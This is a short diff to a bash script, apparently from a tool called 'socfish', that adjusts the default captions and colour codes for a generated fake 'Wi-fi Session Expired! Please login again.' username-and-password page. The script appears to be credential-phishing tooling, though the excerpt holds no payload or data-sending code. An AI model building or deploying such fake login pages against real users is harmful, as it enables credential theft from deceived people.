@@ -171,13 +171,13 @@ cd socfish
 }
 
 createpage() {
-default_cap1="Wi-fi Session Expired"
+default_cap1="Wi-fi Session Expired!"
 default_cap2="Please login again."
 default_user_text="Username:"
 default_pass_text="Password:"
 default_sub_text="Log-In"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: \e[1;77mWi-fi Session Expired!\e[1;92m): \e[0m' cap1
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: \e[0m\e[1;77mWi-fi Session Expired!\e[0m\e[1;92m): \e[0m' cap1
 cap1="${cap1:-${default_cap1}}"
 
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 2 (Default: \e[1;77mPlease login again.\e[1;92m): \e[0m' cap2
